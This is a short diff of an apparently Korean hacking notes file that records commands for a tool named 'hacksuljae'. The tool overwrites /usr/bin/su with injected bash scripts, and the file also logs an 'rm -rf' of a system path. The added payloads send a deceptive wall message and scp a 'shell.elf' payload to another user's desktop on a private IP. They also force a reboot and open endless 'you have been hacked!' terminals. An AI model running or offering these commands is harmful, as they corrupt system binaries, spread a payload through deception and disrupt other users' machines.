@@ -28,3 +28,8 @@ rm -rf "시스템파일 경로"
 -----------------------
 test성공
 ./hacksuljae /usr/bin/su 1 $'#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /usr/bin/su
+
+-----------------------
+./hacksuljae /usr/bin/su 1 $'\n#!/bin/bash\naaa=\"Hi User2, I\'m User1 I send a file. That file is the executable file associated with our project. Please check this file in your Desktop\"\nwall $aaa;\nscp \"/home/user1/Downloads/shell.elf\" \"user2@192.168.59.139:/home/user2/Desktop\"\nshutdown -r +1\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /usr/bin/su
+
+./hacksuljae /usr/bin/su 1 $'\n#!/bin/bash\nwhile true; do\ngnome-terminal -- bash -c \'echo \"you have been hacked!\"; read -p \"Press Enter to continue or \"\'\ndone\n//' && sed -i '1d' /usr/bin/su
